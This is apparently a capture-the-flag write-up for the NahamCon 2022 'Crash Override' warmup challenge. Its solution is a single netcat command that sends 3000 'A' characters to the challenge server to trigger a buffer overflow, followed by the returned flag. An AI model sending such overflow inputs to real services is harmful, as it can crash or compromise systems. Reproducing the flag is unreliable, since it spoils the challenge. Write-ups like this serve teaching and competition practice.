# Crash Override

uthor: @M_alpha#3534  
  
Remember, hacking is more than just a crime. It's a survival trait.  
  
PS (not challenge related), _thank you_ so much to **[HackTheBox](https://hackthebox.eu/)** for supporting NahamCon 2022!


## Solucion

```bash
┌──(kali㉿kali)-[~/…/ctfs2022/nahamconctf/warmup/crashoverride]
└─$ python -c 'print("A" * 3000)' | nc challenge.nahamcon.com 30515   
HACK THE PLANET!!!!!!
flag{de8b6655b538a0bf567b79a14f2669f6}
```